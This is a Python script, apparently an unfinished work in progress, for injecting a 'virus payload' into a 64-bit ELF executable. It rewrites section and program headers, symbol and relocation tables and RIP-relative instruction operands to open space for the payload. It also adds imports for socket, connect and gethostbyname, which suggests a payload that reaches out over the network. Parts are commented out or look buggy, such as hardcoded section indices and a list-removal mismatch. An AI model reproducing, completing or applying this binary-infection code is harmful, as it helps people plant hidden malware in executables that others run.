#write
#strlen
#__stack_chk_fail
#htons
#memset
#close
#read
#gethostbyname
#memcpy
#connect
#socket

from elftools import *
from elftools.elf.elffile import ELFFile
from elftools.elf.enums import ENUM_D_TAG_COMMON
from capstone import Cs, CS_ARCH_X86, CS_MODE_64
from iced_x86 import *
import os
import array

# Initialize the Capstone disassembler
md = Cs(CS_ARCH_X86, CS_MODE_64)

def modify_file(original_file,offset,data):
    original_file.seek(offset)
    original_file.write(data)

def edit_elf_section(elf_object,original_file,elf_section,section_index,size):   
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_offset_offset = 24
    section_addr_offset = 16
    total_section_addr_offset = section_header_table + section_header_size * section_index + section_addr_offset
    total_section_offset_offset = section_header_table + section_header_size * section_index + section_offset_offset
    section_offset = elf_section['sh_offset'] 
    section_addr = elf_section['sh_addr']
    #changing offset
    modify_file(original_file,total_section_offset_offset,(size + section_offset).to_bytes(8,'little'))
    #changing virtual address
    modify_file(original_file,total_section_addr_offset,(size + section_addr).to_bytes(8,'little'))

def edit_elf_sections(elf_object,original_file,section,size):
    """ Edits all sections by size after section
    """
    for i in range(elf_object.get_section_index(section)+1,elf_object.num_sections()):
        edit_elf_section(elf_object,original_file,elf_object.get_section(i),i,size)

def edit_text_size(elf_object,original_file,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    text_index = 16
    text_section = elf_object.get_section_by_name(".text")
    text_section_size = text_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * text_index + section_size_offset
    modify_file(original_file,total_section_size_offset,(text_section_size+size).to_bytes(8,'little'))


def edit_program_header(elf_object,original_file,inject_offset,size):
    program_header_offset = elf_object['e_phoff']
    num_segments = elf_object.num_segments()
    offset_offset = 8
    filesz_offset = 32
    memsz_offset = 40
    virtual_offset = 16
    physical_offset = 24
    header_size = elf_object['e_phentsize']
    for i in range(num_segments):
        segment = elf_object.get_segment(i)
        if segment['p_offset'] > inject_offset:
            segment_offset = program_header_offset + i * header_size
            modify_file(original_file,segment_offset + offset_offset,(segment['p_offset']+size).to_bytes(8,'little'))
            modify_file(original_file,segment_offset + virtual_offset,(segment['p_vaddr']+size).to_bytes(8,'little'))
            modify_file(original_file,segment_offset + physical_offset,(segment['p_paddr']+size).to_bytes(8,'little'))


def edit_text_section(elf_object,original_file,inject_offset,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    text_index = 16
    text_section = elf_object.get_section_by_name(".text")
    text_section_size = text_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * text_index + section_size_offset
    modify_file(original_file,total_section_size_offset,(text_section_size+size).to_bytes(8,'little'))


    program_header_offset = elf_object['e_phoff']
    num_segments = elf_object.num_segments()
    filesz_offset = 32
    memsz_offset = 40
    filesz_offset = 32
    memsz_offset = 40
    header_size = elf_object['e_phentsize']
    for i in range(num_segments):
        segment = elf_object.get_segment(i)
        start = segment['p_offset']
        end = start + segment['p_filesz']
        if inject_offset >= start and inject_offset < end:
            modify_file(original_file,program_header_offset + i * header_size + filesz_offset,(segment['p_filesz']+size).to_bytes(8,'little'))
            modify_file(original_file,program_header_offset + i * header_size + memsz_offset,(segment['p_memsz']+size).to_bytes(8,'little'))



def edit_symbol_table(elf_object,original_file,inject_offset,size):
    value_offset = 8
    sym_tab = elf_object.get_section_by_name(".symtab")
    sym_tab_offset = sym_tab['sh_offset']
    sym_size = 24
    num_symbols = sym_tab.num_symbols()
    for i in range(num_symbols):
        #print(i,sym_tab.get_symbol(i)['st_name'],sym_tab.get_symbol(i).name)
        sym = sym_tab.get_symbol(i)['st_value']
        if (sym > inject_offset):
            modify_file(original_file,sym_tab_offset + sym_size * i + value_offset,(sym+size).to_bytes(8,'little'))

def edit_dynamic_section(elf_object,original_file,inject_offset,size):
    dynamic_section_entry_size = 16
    dynamic_section_offset = elf_object.get_section_by_name(".dynamic")['sh_offset']
    dynamic_section = elf_object.get_section_by_name(".dynamic")
    max_common_tag = 30
    value_offset = 8
    #print("dynamic section offset ",dynamic_section_offset)
    for i in range(dynamic_section.num_tags()):
        tag = dynamic_section._get_tag(i)
        tag_value = tag['d_ptr']
        #print(tag)
        #print(tag_value)
        #print(tag['d_tag'])
        if (tag['d_tag'] == 'DT_NULL'):
            continue
        if (ENUM_D_TAG_COMMON[tag['d_tag']] < max_common_tag and tag_value > inject_offset):
            #print(tag['d_tag'],dynamic_section._get_tag(i)['d_ptr'])
            modify_file(original_file,dynamic_section_offset + dynamic_section_entry_size * i + value_offset,(tag_value+size).to_bytes(8,'little'))

def edit_rela_dyn_section(elf_object,original_file,size):
    rela_dyn_section = elf_object.get_section_by_name(".rela.dyn")
    rela_dyn_section_offset = elf_object.get_section_by_name(".rela.dyn")['sh_offset']
    rela_dyn_relo_size = 24
    rela_dyn_num_relocations = rela_dyn_section.num_relocations()
    relative_type = 8
    for i in range(rela_dyn_num_relocations):
        if rela_dyn_section.get_relocation(i)['r_info'] != relative_type:
            continue
        rela_dyn_offset = rela_dyn_section.get_relocation(i)['r_offset']
        modify_file(original_file,rela_dyn_section_offset + i * rela_dyn_relo_size,(rela_dyn_offset+size).to_bytes(8,'little'))

def offset_in_rela(elf_object,offset):
    rela_dyn_section = elf_object.get_section_by_name(".rela.dyn")
    rela_dyn_num_relocations = rela_dyn_section.num_relocations()
    relative_type = 8

    rela_plt_section = elf_object.get_section_by_name(".rela.plt")
    rela_plt_num_relocations = rela_plt_section.num_relocations()

    for i in range(rela_dyn_num_relocations):
        if offset == rela_dyn_section.get_relocation(i)['r_offset'] and rela_dyn_section.get_relocation(i)['r_info'] != relative_type:
            return True
    for i in range(rela_plt_num_relocations):
        if offset == rela_plt_section.get_relocation(i)['r_offset']:
            return True
    return False


def edit_code_section(elf_object,original_file,section_offset,section_size,inject_offset,size):
    start = section_offset
    end = section_offset + section_size

    original_file.seek(start)  # Move the file pointer to the starting offset
    code = original_file.read(end - start)
    decoder = Decoder(64, code, ip=start)
    formatter = Formatter(FormatterSyntax.NASM)
    for instr in decoder:
        disasm = formatter.format(instr)
        rel_mem = instr.ip_rel_memory_address
        next_ip = instr.ip + instr.len

        operand = rel_mem - next_ip
        instruction_length = instr.len
        start_index = instr.ip
        end_index = start_index + instruction_length
        instruction_bytes = code[start_index-start:end_index-start]
        if ((instr.ip < inject_offset < rel_mem) or (rel_mem < inject_offset < instr.ip)) and rel_mem < os.path.getsize(original_file.name) and not offset_in_rela(elf_object,rel_mem):
            searching_bytes = operand.to_bytes(4, byteorder='little',signed=True)
            hex_code = ' '.join(f'{byte:02X}' for byte in instruction_bytes)
            hex_bytes = bytes.fromhex(hex_code)
            try:
                instruction_offset = instr.ip + hex_bytes.index(searching_bytes)
            except:
                continue
            modify_file(original_file,instruction_offset,(rel_mem - next_ip + size if instr.ip < inject_offset < rel_mem else rel_mem - next_ip - size).to_bytes(4,'little',signed=True))
            #print(hex(instr.ip),"|",disasm,hex(rel_mem),"|"," Next instruction: ",hex(next_ip),"|"," Operand ",hex(rel_mem - next_ip)," | Memory offset",hex(instruction_offset)," | Hex Code: ",hex_code)

def edit_text_section_calls(elf_object,original_file,inject_offset,size):
    modify_file(original_file,0x11a4,(0xc9).to_bytes(1,'little'))
    for i in range(elf_object.num_segments()):
        if elf_object.get_segment(i)['p_flags'] & 0x1 == 1:
            offset = elf_object.get_segment(i)['p_offset']
            end = offset + elf_object.get_segment(i)['p_filesz']
            for i in range(elf_object.num_sections()):
                if elf_object.get_section(i)['sh_offset'] >= offset and elf_object.get_section(i)['sh_offset'] < end:
                    edit_code_section(elf_object,original_file,elf_object.get_section(i)['sh_offset'],elf_object.get_section(i)['sh_size'],inject_offset,size)

symbol_names = [ "htons@GLIBC_2.2.5", "memset@GLIBC_2.2.5", "close@GLIBC_2.2.5", "read@GLIBC_2.2.5", "gethostbyname@GLIBC_2.2.5","memcpy@GLIBC_2.14","connect@GLIBC_2.2.5","socket@GLIBC_2.2.5", "__stack_chk_fail@GLIBC_2.4","write@GLIBC_2.2.5","strlen@GLIBC_2.2.5"]




import array

# Function to read an ELF file as bytes
def read_elf_file(file_path):
    with open(file_path, 'rb') as file:
        return file.read()

# Function to write bytes to an ELF file
def write_elf_file(data, file_path):
    with open(file_path, 'wb') as file:
        file.write(data)

# Function to insert bytes at a specified offset in an ELF file
def insert_bytes_in_elf(elf_bytes, offset, bytes_to_insert):
    elf_bytearray = bytearray(elf_bytes)
    
    # Check if the offset is within the ELF file
    if offset >= len(elf_bytearray):
        raise ValueError(f"Offset {offset} is out of bounds for the ELF file.")
    
    # Insert the bytes at the specified offset
    elf_bytearray[offset:offset] = bytes_to_insert
    
    return bytes(elf_bytearray)


def add_contents_to_file(offset,file,array_contents,array_sizes):
    for i in range(len(array_contents)):
        elf_bytes = read_elf_file('hello')
        #print(i,hex(offset))
        modified_elf_bytes = insert_bytes_in_elf(elf_bytes, offset, array_contents[i].to_bytes(array_sizes[i],'little'))
        offset+=array_sizes[i]
        # Write the modified ELF bytes back to the file
        write_elf_file(modified_elf_bytes, 'hello')


def check_duplicate_symbols(elf_object):
    value_offset = 8
    sym_tab = elf_object.get_section_by_name(".symtab")
    sym_tab_offset = sym_tab['sh_offset']
    sym_size = 24
    num_symbols = sym_tab.num_symbols()
    for i in range(num_symbols):
        print(i,sym_tab.get_symbol(i)['st_info'])
        if sym_tab.get_symbol(i).name in symbol_names:
            symbol_names.remove(sym_tab.get_symbol(i))
    #print(i,sym_tab.get_symbol(i)['st_name'],sym_tab.get_symbol(i).name)

def add_functions_to_sym_tab(elf_object,file):
    section = elf_object.get_section_by_name(".symtab")
    offset = section['sh_offset'] + section['sh_size']
    for i in range(len(symbol_names)):
        name = 0x0
        print(hex(offset))
        add_contents_to_file(offset,file,[name,0x12,0x0,0x0,0x0,0x0],[4,1,1,2,8,8])
        offset+= section['sh_entsize']

def add_functions_to_rela_plt(elf_object,file):
    section = elf_object.get_section_by_name(".rela.plt")
    offset = section['sh_offset'] + section['sh_size']
    for i in range(len(symbol_names)):
        add_contents_to_file(offset,file,[0x0,0x0,0x0],[8,8,8])
        offset+= section['sh_entsize']

def edit_rela_plt_section(elf_object,original_file,inject_offset,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    text_index = 11
    text_section = elf_object.get_section_by_name(".symtab")
    text_section_size = text_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * text_index + section_size_offset
    #print(hex(text_section_size))
    modify_file(original_file,total_section_size_offset,(text_section_size+size).to_bytes(8,'little'))

def edit_sym_tab_section(elf_object,original_file,inject_offset,size):
    section_header_table = elf_object['e_shoff']
    section_header_size = elf_object['e_shentsize']
    section_size_offset = 32
    text_index = 28
    text_section = elf_object.get_section_by_name(".symtab")
    text_section_size = text_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * text_index + section_size_offset
    #print(hex(text_section_size))
    modify_file(original_file,total_section_size_offset,(text_section_size+size).to_bytes(8,'little'))


virus_payload_size = 0x2fe
virus_payload_inject_offset = 0x1169

size = 16 #for hello
size = virus_payload_size

f = open('hello','r+b')
elf = ELFFile(open('hello','rb'))
inject_offset = 0x1194 # for hello
inject_offset = virus_payload_inject_offset

#modify_file(f,40,(elf['e_shoff']+size).to_bytes(8,'little'))

#edit_text_section_calls(elf,f,inject_offset,size)

#edit_text_section(elf,f,inject_offset,size)
#edit_elf_sections( elf,f,'.text',size)
#edit_symbol_table(elf,f,inject_offset,size)
#edit_program_header(elf,f,inject_offset,size)
#edit_dynamic_section(elf,f,inject_offset,size)
#edit_rela_dyn_section(elf,f,size)

##### Testing

check_duplicate_symbols(elf)
section = elf.get_section_by_name(".symtab")
inject_offset = section['sh_offset'] + section['sh_size']
size = len(symbol_names) * section['sh_entsize']



edit_elf_sections( elf,f,'.symtab',size)
edit_symbol_table(elf,f,inject_offset,size)
edit_program_header(elf,f,inject_offset,size)
edit_dynamic_section(elf,f,inject_offset,size)
edit_rela_dyn_section(elf,f,size)

edit_sym_tab_section(elf,f,inject_offset,size)


modify_file(f,40,(elf['e_shoff']+size).to_bytes(8,'little'))
add_functions_to_sym_tab(elf,f)


section = elf.get_section_by_name(".rela.plt")
inject_offset = section['sh_offset'] + section['sh_size']
size = len(symbol_names) * section['sh_entsize']

edit_elf_sections( elf,f,'.rela.plt',size)
edit_symbol_table(elf,f,inject_offset,size)
edit_program_header(elf,f,inject_offset,size)
edit_dynamic_section(elf,f,inject_offset,size)
edit_rela_dyn_section(elf,f,size)


edit_rela_plt_section(elf,f,inject_offset,size)

modify_file(f,40,(elf['e_shoff']+size).to_bytes(8,'little'))

add_functions_to_rela_plt(elf,f)